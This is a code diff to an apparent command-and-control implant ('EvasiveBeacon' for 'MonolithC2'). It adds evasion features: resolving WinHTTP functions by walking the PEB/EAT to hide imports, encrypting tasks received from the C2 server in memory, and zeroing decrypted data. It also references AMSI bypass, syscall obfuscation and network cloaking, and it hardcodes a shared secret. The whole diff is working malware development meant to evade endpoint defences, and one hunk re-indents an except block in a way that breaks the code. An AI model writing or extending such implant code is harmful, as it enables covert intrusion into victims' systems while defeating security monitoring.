@@ -167,11 +167,20 @@ try:
     )
     NETWORK_CLOAKING_AVAILABLE = True
 except ImportError:
-    NETWORK_CLOAKING_AVAILABLE = False
-    MonolithNetworkCloaker = None
-    ProcessLegitimacy = None
-    NetworkCloakResult = None
-    print("[!] Network cloaking engine not available")
+            NETWORK_CLOAKING_AVAILABLE = False
+            MonolithNetworkCloaker = None
+            ProcessLegitimacy = None
+            NetworkCloakResult = None
+            print("[!] Network cloaking engine not available")
+
+# NEW: Import PEB/EAT walker for IAT cloaking
+try:
+    from evasion.peb_eat_walker import get_peb_finder
+    PEB_WALKER_AVAILABLE = True
+except ImportError:
+    PEB_WALKER_AVAILABLE = False
+    get_peb_finder = None
+    print("[!] PEB/EAT walker not available")
 
 # NEW: Import syscall obfuscation monster
 try:
@@ -393,77 +402,6 @@ class _WinHTTPSession:
             self._session = 0
 
 
-class _WinHTTPRequest:
-    def __init__(self, h_connect, api):
-        self._api = api
-        self._h_connect = h_connect
-        self._h_request = None
-
-    def open(
-        self,
-        method: str,
-        path: str,
-        use_ssl: bool,
-        extra_headers: Dict[str, str],
-        body: Optional[bytes],
-    ):
-        flags = WINHTTP_FLAG_SECURE if use_ssl else 0
-        self._h_request = self._api.WinHttpOpenRequest(
-            self._h_connect._handle,
-            ctypes.c_wchar_p(method),
-            ctypes.c_wchar_p(path),
-            None,
-            None,
-            None,
-            flags,
-        )
-        if not self._h_request:
-            raise OSError("WinHttpOpenRequest failed")
-
-        header_lines = "\r\n".join(f"{k}: {v}" for k, v in extra_headers.items())
-        if header_lines:
-            header_lines += "\r\n"
-
-        body_ptr = ctypes.create_string_buffer(body) if body else None
-        body_len = len(body) if body else 0
-
-        ok = self._api.WinHttpSendRequest(
-            self._h_request._handle if hasattr(self._h_request, '_handle') else self._h_request,
-            ctypes.c_wchar_p(header_lines),
-            ctypes.c_uint(len(header_lines)),
-            body_ptr,
-            ctypes.c_uint(body_len),
-            ctypes.c_uint(body_len),
-            0,
-        )
-        if not ok:
-            raise OSError("WinHttpSendRequest failed")
-
-        ok = self._api.WinHttpReceiveResponse(self._h_request, None)
-        if not ok:
-            raise OSError("WinHttpReceiveResponse failed")
-
-    def read(self) -> bytes:
-        api = self._api
-        h_req = self._h_request
-        data = bytearray()
-        buf = ctypes.create_string_buffer(8192)
-
-        while True:
-            read = ctypes.c_uint(0)
-            ok = api.WinHttpReadData(h_req, buf, ctypes.c_uint(len(buf)), ctypes.byref(read))
-            if not ok or read.value == 0:
-                break
-            data.extend(buf.raw[: read.value])
-
-        return bytes(data)
-
-    def close(self):
-        if self._h_request:
-            self._api.WinHttpCloseHandle(self._h_request)
-            self._h_request = None
-
-
 class WinHTTPNetworkStack:
     """
     Native Windows HTTP stack via WinHTTP + Schannel.
@@ -474,6 +412,27 @@ class WinHTTPNetworkStack:
         self.config = beacon_config
         self.system = platform.system()
         self._session = None
+        self._peb_finder = None
+        self._manual_api_cache: Dict[str, int] = {}
+
+        if PEB_WALKER_AVAILABLE:
+            try:
+                self._peb_finder = get_peb_finder()
+                self._resolve_winhttp_manual()
+            except Exception:
+                pass
+
+    def _resolve_winhttp_manual(self):
+        """Resolve WinHTTP functions via PEB/EAT walking (no IAT hooks)."""
+        if not self._peb_finder:
+            return
+        
+        functions = self._peb_finder.resolve_winhttp_functions()
+        self._manual_api_cache = functions
+
+    def _get_manual_api(self, func_name: str) -> Optional[int]:
+        """Get manually resolved WinHTTP function address."""
+        return self._manual_api_cache.get(func_name)
 
     def _get_session(self) -> _WinHTTPSession:
         if not self._session:
@@ -577,6 +536,36 @@ class TransientNetworkCrypto:
             return aesgcm.decrypt(nonce, ciphertext, None)
         except Exception:
             return encoded
+
+
+class TaskCrypto:
+    """Encrypt/decrypt tasks in memory. No plaintext tasks stored."""
+
+    def __init__(self, key: bytes = None):
+        self._key = key or os.urandom(32)
+
+    def encrypt_task(self, task_data: bytes) -> bytes:
+        if not HAS_AES_GCM or not task_data:
+            return task_data
+        try:
+            nonce = os.urandom(12)
+            aesgcm = AESGCM(self._key)
+            ciphertext = aesgcm.encrypt(nonce, task_data, None)
+            return base64.b64encode(nonce + ciphertext)
+        except Exception:
+            return task_data
+
+    def decrypt_task(self, encrypted_data: bytes) -> bytes:
+        if not HAS_AES_GCM or not encrypted_data:
+            return encrypted_data
+        try:
+            raw = base64.b64decode(encrypted_data) if isinstance(encrypted_data, (bytes, bytearray)) else encrypted_data
+            nonce = raw[:12]
+            ciphertext = raw[12:]
+            aesgcm = AESGCM(self._key)
+            return aesgcm.decrypt(nonce, ciphertext, None)
+        except Exception:
+            return encrypted_data
 
 
 # =============================================================================
@@ -775,11 +764,25 @@ class EvasiveBeacon:
                 print(f"[!] Failed to initialize WinHTTP stack: {e}")
                 self._winhttp_stack = None
 
+        # NEW: PEB/EAT walker for IAT cloaking
+        self._peb_finder = None
+        if PEB_WALKER_AVAILABLE and platform.system() == "Windows":
+            try:
+                self._peb_finder = get_peb_finder()
+                print("[+] PEB/EAT walker initialized for IAT cloaking")
+            except Exception as e:
+                print(f"[!] Failed to initialize PEB walker: {e}")
+                self._peb_finder = None
+
         # NEW: Transient network encryption (AES-256-GCM)
         self.network_crypto = TransientNetworkCrypto(
             beacon_id=config.beacon_id,
             shared_secret="MonolithC2TransientSecret2026",
         )
+
+        # NEW: Transient task encryption (tasks never stored plaintext in memory)
+        self._task_encryption_key = os.urandom(32)
+        self._pending_tasks: Dict[str, bytes] = {}
 
         # NEW: Initialize HWBP AMSI bypass engine
         self.hwbp_amsi = None
@@ -1652,9 +1655,66 @@ class EvasiveBeacon:
             raw = self._http_request(req_meta)
             self.state.last_checkin = datetime.now()
             result = json.loads(raw.decode())
-            return result.get("tasks", [])
+            tasks = result.get("tasks", [])
+            
+            # Encrypt tasks in memory - never store plaintext task strings
+            encrypted_tasks = []
+            for task in tasks:
+                task_json = json.dumps(task).encode()
+                encrypted = self._encrypt_task_in_memory(task_json)
+                encrypted_tasks.append(encrypted)
+            
+            # Decrypt only when executing, then immediately zero memory
+            decrypted_tasks = []
+            for encrypted_task in encrypted_tasks:
+                decrypted = self._decrypt_task_in_memory(encrypted_task)
+                if decrypted:
+                    try:
+                        task_dict = json.loads(decrypted)
+                        decrypted_tasks.append(task_dict)
+                    except Exception:
+                        pass
+                    # Zero out decrypted bytes from memory
+                    self._zero_memory(decrypted)
+            
+            return decrypted_tasks
         except Exception as e:
             raise ConnectionError(f"Failed to check in: {e}")
+
+    def _encrypt_task_in_memory(self, task_data: bytes) -> bytes:
+        """Encrypt task data for storage in memory."""
+        if hasattr(self, '_task_encryption_key'):
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            nonce = os.urandom(12)
+            aesgcm = AESGCM(self._task_encryption_key)
+            ciphertext = aesgcm.encrypt(nonce, task_data, None)
+            return base64.b64encode(nonce + ciphertext)
+        return task_data
+
+    def _decrypt_task_in_memory(self, encrypted_data: bytes) -> bytes:
+        """Decrypt task data for execution."""
+        if hasattr(self, '_task_encryption_key'):
+            try:
+                raw = base64.b64decode(encrypted_data)
+                nonce = raw[:12]
+                ciphertext = raw[12:]
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                aesgcm = AESGCM(self._task_encryption_key)
+                return aesgcm.decrypt(nonce, ciphertext, None)
+            except Exception:
+                pass
+        return encrypted_data if isinstance(encrypted_data, bytes) else b""
+
+    def _zero_memory(self, data: bytes):
+        """Attempt to zero out sensitive data from memory."""
+        try:
+            # Create a mutable copy and overwrite
+            if isinstance(data, (bytes, bytearray)):
+                mutable = bytearray(data)
+                for i in range(len(mutable)):
+                    mutable[i] = 0
+        except Exception:
+            pass
 
     def _send_results(self):
         """Send task results to C2"""
